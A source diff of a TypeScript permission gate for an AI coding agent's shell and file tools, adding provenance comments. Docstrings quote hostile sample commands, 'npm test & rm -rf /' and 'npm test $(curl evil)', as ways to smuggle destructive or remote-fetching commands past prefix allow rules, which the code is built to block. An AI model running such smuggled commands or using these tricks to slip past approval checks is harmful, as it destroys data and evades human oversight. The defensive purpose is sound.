@@ -32,22 +32,27 @@ export const READONLY_COMMANDS: Set<string> = new Set(['ls', 'cat', 'head', 'tai
 
 // ── Module: ShellParsing ──
 
+// @kern-source: tool-permissions:29
 export function stripShellWrappers(command: string): string {
   return command.trim().replace(/^(?:(?:timeout|time|nice|nohup|env|command)(?:[ \t\n\r\f\v]+-\S+)*)[ \t\n\r\f\v]+/, '');
 }
 
+// @kern-source: tool-permissions:33
 export function extractBaseCommand(command: string): string {
   return stripShellWrappers(command).split(/[ \t\n\r\f\v]+/)[0] ?? '';
 }
 
+// @kern-source: tool-permissions:37
 export function stripShellRedirections(command: string): string {
   return command.replace(/[ \t\n\r\f\v]+[0-9]*(?:>>?|<<?)[ \t\n\r\f\v]*\S+/g, '').replace(/[ \t\n\r\f\v]+[0-9]*(?:>&|<&)[ \t\n\r\f\v]*\S+/g, '').trim();
 }
 
+// @kern-source: tool-permissions:41
 export function isDangerousCommand(command: string): boolean {
   return ((lower) => DANGEROUS_COMMANDS.some((dangerous: string) => lower.includes(dangerous)) || DANGEROUS_PREFIXES.some((prefix: string) => lower.startsWith(prefix)))(command.toLowerCase().trim());
 }
 
+// @kern-source: tool-permissions:45
 export function isReadOnlyCommand(command: string): boolean {
   return ((readonlyCommand, commandSeparator) =>
     ((readonlyCommand.includes('&&')
@@ -81,6 +86,7 @@ export const GIT_DIRTY_CACHE_TTL: number = 2000  // 2 seconds;
 
 // ── Module: GitDirtyCache ──
 
+// @kern-source: tool-permissions:77
 export function getGitDirtyFiles(cwd: string): Set<string> {
   const now = Date.now();
   if (_gitDirtyCache.files && _gitDirtyCache.cwd === cwd && now < _gitDirtyCache.expiry) {
@@ -103,12 +109,14 @@ export function getGitDirtyFiles(cwd: string): Set<string> {
   return _gitDirtyCache.files;
 }
 
+// @kern-source: tool-permissions:100
 export function invalidateGitDirtyCache() {
   _gitDirtyCache.files = null;
   _gitDirtyCache.cwd = null;
   _gitDirtyCache.expiry = 0;
 }
 
+// @kern-source: tool-permissions:106
 export function isGitDirtyFile(filePath: string, cwd: string): boolean {
   return ((dirty, fileName) => [...dirty].some((dirtyPath: string) => filePath.endsWith(dirtyPath) || dirtyPath.endsWith(fileName)))(getGitDirtyFiles(cwd), filePath.split('/').pop() ?? filePath);
 }
@@ -116,6 +124,7 @@ export function isGitDirtyFile(filePath: string, cwd: string): boolean {
 
 // ── Module: PermissionChecks ──
 
+// @kern-source: tool-permissions:111
 export function isPathUnderCwd(filePath: string, cwd: string): boolean {
   const resolved = isAbsolute(filePath) ? filePath : resolve(cwd, filePath);
   // Resolve symlinks to prevent traversal via symlinks
@@ -145,6 +154,7 @@ export const _warnedMalformedRules: Set<string> = new Set();
 /**
  * Parse a single Claude-Code-style rule string into {tool, command?, prefix}. Returns null for malformed input. e.g. 'Bash(npm test:*)' → {tool:'Bash', command:'npm test', prefix:true}; 'Edit' → {tool:'Edit', prefix:false}.
  */
+// @kern-source: tool-permissions:144
 export function parsePermissionRule(raw: unknown): ParsedPermissionRule|null {
   if (typeof raw !== 'string') return null;
   const trimmed = raw.trim();
@@ -176,6 +186,7 @@ export function parsePermissionRule(raw: unknown): ParsedPermissionRule|null {
 /**
  * Normalize a raw permissions object into parsed allow/deny rule sets. Fail-safe: any malformed entry is skipped (warned once); a non-object input yields empty sets. Never throws.
  */
+// @kern-source: tool-permissions:174
 export function parsePermissionRuleSet(raw: unknown): PermissionRuleSet {
   const empty: PermissionRuleSet = { allow: [], deny: [] };
   if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return empty;
@@ -212,6 +223,7 @@ export function parsePermissionRuleSet(raw: unknown): PermissionRuleSet {
 /**
  * Does a parsed rule match a (tool, command) pair? Tool name match is case-sensitive (CC uses exact tool names). A rule with no command is tool-level (matches any invocation of that tool). A prefix rule (':*' suffix) matches when the command starts with the rule command on a word boundary; a non-prefix command rule matches exactly. Bash prefix 'npm test' matches 'npm test -- --filter x' but NOT 'npm testify'.
  */
+// @kern-source: tool-permissions:209
 export function ruleMatches(rule: ParsedPermissionRule, tool: string, command: string): boolean {
   if (rule.tool !== tool) return false;
   // Tool-level rule (no command) matches any invocation of the tool.
@@ -230,6 +242,7 @@ export function ruleMatches(rule: ParsedPermissionRule, tool: string, command: s
 /**
  * Evaluate parsed allow/deny rule sets against a (tool, command). Returns 'deny' if ANY deny rule matches (deny always wins), else 'allow' if any allow rule matches, else null (fall through to normal ask flow). NOTE: this is the simple single-token matcher; for the security-correct gate use evaluateToolRules, which adds Bash compound-segment splitting (F2) and file-path resolution (F3).
  */
+// @kern-source: tool-permissions:226
 export function evaluatePermissionRules(tool: string, command: string, rules: PermissionRuleSet): 'allow'|'deny'|null {
   for (const rule of rules.deny) {
     if (ruleMatches(rule, tool, command)) return 'deny';
@@ -243,6 +256,7 @@ export function evaluatePermissionRules(tool: string, command: string, rules: Pe
 /**
  * True if the command contains shell control operators or substitution that make single-token prefix matching unsafe: && || ; | & (background) $( ` > >> and newlines/CR. Single & and newline ARE separators — omitting them let `npm test & rm -rf /` ride a prefix allow rule (security re-review of 7090dff8). Used to decide whether Bash rule evaluation must split into segments.
  */
+// @kern-source: tool-permissions:245
 export function hasShellControl(command: string): boolean {
   return /&&|\|\||;|\||\$\(|`|>>?|&|[\n\r]/.test(command);
 }
@@ -250,6 +264,7 @@ export function hasShellControl(command: string): boolean {
 /**
  * True if the command contains an output redirection operator (> or >>). A redirection target lives outside the command token a prefix rule matches, so a redirecting command can never be auto-allowed by a prefix rule — it falls through to ask.
  */
+// @kern-source: tool-permissions:251
 export function hasRedirection(command: string): boolean {
   return />>?/.test(command);
 }
@@ -257,6 +272,7 @@ export function hasRedirection(command: string): boolean {
 /**
  * True if the command contains command substitution: $(...) or backticks. The substituted command is opaque to segment-splitting (it does not appear as a top-level segment), so a substituting command can never be auto-allowed by a prefix rule — it falls through to ask. e.g. `npm test $(curl evil)` must not ride a `Bash(npm test:*)` allow.
  */
+// @kern-source: tool-permissions:257
 export function hasSubstitution(command: string): boolean {
   return /\$\(|`/.test(command);
 }
@@ -264,6 +280,7 @@ export function hasSubstitution(command: string): boolean {
 /**
  * Split a compound shell command into its executable segments on &&, ||, ; , | (pipe), single & (background), and newlines/CR. Command-substitution bodies $(...) / backticks are NOT executed-as-segments here; their PRESENCE alone forces ask via hasShellControl, so segment-level allow can never fire on a substituting command. Empty segments are dropped.
  */
+// @kern-source: tool-permissions:263
 export function splitShellSegments(command: string): string[] {
   const sep = String.fromCharCode(59); // ';'
   return command
@@ -276,6 +293,7 @@ export function splitShellSegments(command: string): string[] {
 /**
  * F2-hardened Bash rule evaluation. For a simple (no control-op) command, behaves like evaluatePermissionRules. For a compound command: deny if ANY segment matches a deny rule; allow ONLY if EVERY segment matches an allow rule (and there is no redirection); otherwise null (ask). Command substitution / backticks force ask. This closes the `npm test && rm -rf /` auto-approve hole.
  */
+// @kern-source: tool-permissions:274
 export function evaluateBashRules(command: string, rules: PermissionRuleSet): 'allow'|'deny'|null {
   const cmd = command.trim();
   // Deny always wins — check the whole command AND every segment.
@@ -308,6 +326,7 @@ export function evaluateBashRules(command: string, rules: PermissionRuleSet): 'a
 /**
  * Resolve a tool file_path to an absolute, symlink-canonical path for rule matching. Absolute paths are kept; relative paths resolve against cwd. realpathSync canonicalizes existing paths; when the file does not exist yet, the longest existing ancestor is realpath'd and the remaining tail re-appended (so ../ escapes and symlinked parents are still resolved). Never throws.
  */
+// @kern-source: tool-permissions:311
 export function resolveRulePath(filePath: string, cwd: string): string {
   try {
     const abs = isAbsolute(filePath) ? filePath : resolve(cwd, filePath);
@@ -339,6 +358,7 @@ export function resolveRulePath(filePath: string, cwd: string): string {
 /**
  * Does a parsed file-tool rule match a resolved absolute path? Tool name must match. A command-less rule (bare `Edit`) is tool-level → matches any path. The rule path is itself resolved against cwd AND symlink-canonicalized the same way as the target (so `Edit(/etc:*)` matches `/etc/passwd` even though /etc → /private/etc on macOS). A match is exact equality or, for a ':*' prefix rule, the target sitting under the rule path on a '/'-segment boundary (so `Edit(/etc:*)` matches `/etc/passwd` but not `/etcother`). An exact (non-prefix) path rule matches only that exact file.
  */
+// @kern-source: tool-permissions:341
 export function pathRuleMatches(rule: ParsedPermissionRule, tool: string, resolvedPath: string, cwd: string): boolean {
   if (rule.tool !== tool) return false;
   if (rule.command === undefined) return true;
@@ -357,6 +377,7 @@ export function pathRuleMatches(rule: ParsedPermissionRule, tool: string, resolv
 /**
  * F3-hardened evaluation for file tools (Edit/Write/Read). Resolves the path (absolute + realpath, ../ and symlink safe) then matches on '/'-segment boundaries. deny wins. A bare tool rule (Edit/Write/Read) still matches any invocation.
  */
+// @kern-source: tool-permissions:358
 export function evaluateFilePathRules(tool: string, filePath: string, cwd: string, rules: PermissionRuleSet): 'allow'|'deny'|null {
   const resolved = resolveRulePath(filePath, cwd);
   for (const rule of rules.deny) {
@@ -371,6 +392,7 @@ export function evaluateFilePathRules(tool: string, filePath: string, cwd: strin
 /**
  * The security-correct gate consulted by every approval seam. Dispatches Bash (arg = the command) to evaluateBashRules (F2 compound splitting) and the file tools Edit/Write/MultiEdit/Read (arg = the file_path) to evaluateFilePathRules (F3 path resolution). Any other tool uses the simple single-token matcher. deny ALWAYS wins; allow auto-approves; null falls through to the normal ask flow.
  */
+// @kern-source: tool-permissions:371
 export function evaluateToolRules(tool: string, arg: string, cwd: string, rules: PermissionRuleSet): 'allow'|'deny'|null {
   if (tool === 'Bash') return evaluateBashRules(arg, rules);
   if (tool === 'Edit' || tool === 'Write' || tool === 'MultiEdit' || tool === 'Read') {
